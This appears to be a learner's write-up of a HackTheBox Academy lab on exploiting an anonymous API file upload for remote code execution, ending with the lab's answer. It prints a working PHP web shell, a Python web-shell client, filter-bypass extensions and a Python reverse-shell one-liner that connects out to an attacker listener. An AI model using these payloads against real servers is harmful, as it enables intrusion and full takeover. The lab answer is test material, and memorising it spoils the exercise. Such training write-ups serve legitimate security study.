Arbitrary file uploads are among the most critical vulnerabilities. These flaws enable attackers to upload malicious files, execute arbitrary commands on the back-end server, and even take control over the entire server. Arbitrary file upload vulnerabilities affect web applications and APIs alike.

## PHP File Upload via API to RCE

Proceed to the end of this section and click onÂ `Click here to spawn the target system!`Â or theÂ `Reset Target`Â icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target application and follow along.

Suppose we are assessing an application residing inÂ `http://<TARGET IP>:3001`.

When we browse the application, an anonymous file uploading functionality sticks out.Â 

![image](https://academy.hackthebox.com/storage/modules/160/2.png)

Let us create the below file (save it asÂ `backdoor.php`) and try to upload it via the available functionality.


```php
<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>
```

The above allows us to append the parameterÂ _cmd_Â to our request (to backdoor.php), which will be executed usingÂ _system()_. This is if we can determineÂ _backdoor.php_'s location, ifÂ _backdoor.php_Â will be rendered successfully and if no PHP function restrictions exist.

![image](https://academy.hackthebox.com/storage/modules/160/4.png)

- _backdoor.php_Â was successfully uploaded via a POST request toÂ `/api/upload/`. An API seems to be handling the file uploading functionality of the application.
- The content type has been automatically set toÂ `application/x-php`, which means there is no protection in place. The content type would probably be set toÂ `application/octet-stream`Â orÂ `text/plain`Â if there was one.
- Uploading a file with aÂ _.php_Â extension is also allowed. If there was a limitation on the extensions, we could try extensions such asÂ `.jpg.php`,Â `.PHP`, etc.
- Using something likeÂ [file_get_contents()](https://www.php.net/manual/en/function.file-get-contents.php)Â to identify php code being uploaded seems not in place either.
- We also receive the location where our file is stored,Â `http://<TARGET IP>:3001/uploads/backdoor.php`.

We can use the below Python script (save it asÂ `web_shell.py`) to obtain a shell, leveraging the uploadedÂ `backdoor.php`Â file.

Code:Â python

```python
import argparse, time, requests, os # imports four modules argparse (used for system arguments), time (used for time), requests (used for HTTP/HTTPs Requests), os (used for operating system commands)
parser = argparse.ArgumentParser(description="Interactive Web Shell for PoCs") # generates a variable called parser and uses argparse to create a description
parser.add_argument("-t", "--target", help="Specify the target host E.g. http://<TARGET IP>:3001/uploads/backdoor.php", required=True) # specifies flags such as -t for a target with a help and required option being true
parser.add_argument("-p", "--payload", help="Specify the reverse shell payload E.g. a python3 reverse shell. IP and Port required in the payload") # similar to above
parser.add_argument("-o", "--option", help="Interactive Web Shell with loop usage: python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes") # similar to above
args = parser.parse_args() # defines args as a variable holding the values of the above arguments so we can do args.option for example.
if args.target == None and args.payload == None: # checks if args.target (the url of the target) and the payload is blank if so it'll show the help menu
    parser.print_help() # shows help menu
elif args.target and args.payload: # elif (if they both have values do some action)
    print(requests.get(args.target+"/?cmd="+args.payload).text) ## sends the request with a GET method with the targets URL appends the /?cmd= param and the payload and then prints out the value using .text because we're already sending it within the print() function
if args.target and args.option == "yes": # if the target option is set and args.option is set to yes (for a full interactive shell)
    os.system("clear") # clear the screen (linux)
    while True: # starts a while loop (never ending loop)
        try: # try statement
            cmd = input("$ ") # defines a cmd variable for an input() function which our user will enter
            print(requests.get(args.target+"/?cmd="+cmd).text) # same as above except with our input() function value
            time.sleep(0.3) # waits 0.3 seconds during each request
        except requests.exceptions.InvalidSchema: # error handling
            print("Invalid URL Schema: http:// or https://")
        except requests.exceptions.ConnectionError: # error handling
            print("URL is invalid")
```

Use the script as follows.


```shell-session
smoothment@htb[/htb]$ python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes
$ id
uid=0(root) gid=0(root) groups=0(root)
```

To obtain a more functional (reverse) shell, execute the below inside the shell gained through the Python script above. Ensure that an active listener (such as Netcat) is in place before executing the below.


```shell-session
python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes
$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.192",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

Let's begin by going into the application:

![Pasted image 20250219162641.png](../../../../IMAGES/Pasted%20image%2020250219162641.png)


We can upload files, let's upload a file named `backdoor.php` with the following contents:

```php
<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>
```

![Pasted image 20250219162652.png](../../../../IMAGES/Pasted%20image%2020250219162652.png)

Let's use this python script to interact with our webshell:

```python
import argparse, time, requests, os # imports four modules argparse (used for system arguments), time (used for time), requests (used for HTTP/HTTPs Requests), os (used for operating system commands)
parser = argparse.ArgumentParser(description="Interactive Web Shell for PoCs") # generates a variable called parser and uses argparse to create a description
parser.add_argument("-t", "--target", help="Specify the target host E.g. http://<TARGET IP>:3001/uploads/backdoor.php", required=True) # specifies flags such as -t for a target with a help and required option being true
parser.add_argument("-p", "--payload", help="Specify the reverse shell payload E.g. a python3 reverse shell. IP and Port required in the payload") # similar to above
parser.add_argument("-o", "--option", help="Interactive Web Shell with loop usage: python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes") # similar to above
args = parser.parse_args() # defines args as a variable holding the values of the above arguments so we can do args.option for example.
if args.target == None and args.payload == None: # checks if args.target (the url of the target) and the payload is blank if so it'll show the help menu
    parser.print_help() # shows help menu
elif args.target and args.payload: # elif (if they both have values do some action)
    print(requests.get(args.target+"/?cmd="+args.payload).text) ## sends the request with a GET method with the targets URL appends the /?cmd= param and the payload and then prints out the value using .text because we're already sending it within the print() function
if args.target and args.option == "yes": # if the target option is set and args.option is set to yes (for a full interactive shell)
    os.system("clear") # clear the screen (linux)
    while True: # starts a while loop (never ending loop)
        try: # try statement
            cmd = input("$ ") # defines a cmd variable for an input() function which our user will enter
            print(requests.get(args.target+"/?cmd="+cmd).text) # same as above except with our input() function value
            time.sleep(0.3) # waits 0.3 seconds during each request
        except requests.exceptions.InvalidSchema: # error handling
            print("Invalid URL Schema: http:// or https://")
        except requests.exceptions.ConnectionError: # error handling
            print("URL is invalid")
```

Now, let's use it:

```shell-session
python3 web_shell.py -t http://10.129.27.149:3001/uploads/backdoor.php -o yes
```

We get a shell:

![Pasted image 20250219162817.png](../../../../IMAGES/Pasted%20image%2020250219162817.png)

We can try moving it to netcat, let's set up a listener and use the following:

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.192",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

We get this:
![Pasted image 20250219164104.png](../../../../IMAGES/Pasted%20image%2020250219164104.png)

We got a shell in netcat, now, let's read the hostname:

```
root@nix01-websvc:/app/php/uploads# cat /etc/hostname

nix01-websvc
```

Answer is:

```
nix01-websvc
```
